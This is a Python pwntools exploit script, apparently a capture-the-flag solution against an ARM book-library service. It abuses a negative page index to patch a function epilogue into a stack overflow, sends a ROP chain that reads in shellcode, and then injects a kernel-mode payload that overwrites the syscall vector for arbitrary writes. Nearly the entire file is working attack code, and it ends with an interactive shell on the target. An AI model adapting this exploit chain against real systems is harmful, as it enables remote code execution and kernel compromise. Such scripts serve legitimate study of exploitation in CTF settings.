from pwn import *

# x = remote('54.214.122.246', 8888)
x = remote('192.168.141.162', 8888)

def menu():
    x.recvuntil("$")


def add(title, pages):
    menu()
    x.sendline("add")
    x.recvuntil(":")
    x.sendline(title)
    x.recvuntil(":")
    x.sendline(str(len(pages)))
    
    for font,cont in pages:
        x.recvuntil(":")
        x.sendline(font)
        x.recvuntil(":")
        x.sendline(cont)


def edit_page(bookid, page_id, page, smash=None):
    menu()
    x.sendline("edit")
    x.recvuntil(":")
    x.sendline(str(bookid))

    # Flush 3 lines
    x.recvline()
    x.recvline()
    x.recvline()

    # Edit page

    x.sendline("p")
    x.recvuntil(":")
    x.sendline(str(page_id))
    x.recvuntil(":")
    x.sendline(page[0])
    x.recvuntil(":")
    x.sendline(page[1])
    if smash!=None:
        x.sendline(smash)



def edit_title_bug(bookid, title):
    menu()
    x.sendline("edit")
    x.recvuntil(":")
    x.sendline(str(bookid))

    # Flush 3 lines
    x.recvline()
    x.recvline()
    x.recvline()

    # Edit page

    x.sendline("t")
    x.recvuntil(":")
    x.sendline("\x00")
    x.sendline(title)


menu()
x.sendline("library")
# Target the book array itself

list_help = 0x44009cc
read_shift_sp = 0x440064c

write_target = read_shift_sp
print "[*] Write target: ", hex(write_target)

fake_page_ptr = 0x06400818 + 12
title = "AAAABBBB" + p32(fake_page_ptr) + p32(write_target)
assert len(title) < 128
add(title.ljust(128,"X"), [])

add("target", [("font", "content")])

font, content = "AAAA", "BBBB"

pause()
'''
This changes the function epilogue from:

ROM:00056AB8 84 D0 8D E2                 ADD             SP, SP, #0x84 ; Rd = Op1 + Op2
ROM:00056ABC 30 80 BD E8                 LDMFD           SP!, {R4,R5,PC} ; Load Block from Memory

to:

   0x440064c:   andeq   r0, r0, r0
   0x4400650:   ldmfd   sp!, {pc}

This way we get a nice buffer overflow :)
'''

edit_page(1, -292, (font, content), "\x00"*4)

# Now trigger shellcode
x.sendline("read")
x.recvuntil(":")

sc_size = 0x400
ropchain = [
    0x440f2a8 , # : pop {r0,  lr} ; bx lr
    0,          # this is to force r3 = 0 below, but also sys_read!
    0x440e7d0,  # pop {r1, r2, lr} ; mul r3, r2, r0 ; sub r1, r1, r3 ; bx lr
    list_help,  
    sc_size,      # read 0x400 bytes. Arbitrary number
    0x440000c, # svc #0 ; pop {r4, r5, r6, r7, r8, sb, sl, fp, ip, pc}
    0x41414141,  # r4
    0x41414141,  # r5
    0x41414141,  # r6
    0x41414141,  # r7
    0x41414141,  # r8
    0x41414141,  # sb
    0x41414141,  # sl
    0x41414141,  # fp
    0x41414141,  # ip
    list_help,  # pc = return into list_help
]

payload = "".join([p32(i) for i in ropchain])
assert len(ropchain) < 128

x.sendline(payload)

sc = open("sc.bin", "rb").read()
x.send(sc.ljust(sc_size, "\x00"))

print "[*] Waiting for Done flag"
x.recvuntil("D\n")

print "[*] Sending kernel mode payload"

'''
This is the following code:

str r7, [r8, 4]
ldr pc, [pc, 20] 

to replace the syscall reset vector.

This way we get an arbitrary write for each syscall we make
'''
sc = "047088e514f09fe5".decode("hex")
x.send(sc.ljust(16, "\x00"))

print "[*] Go check!"

x.interactive()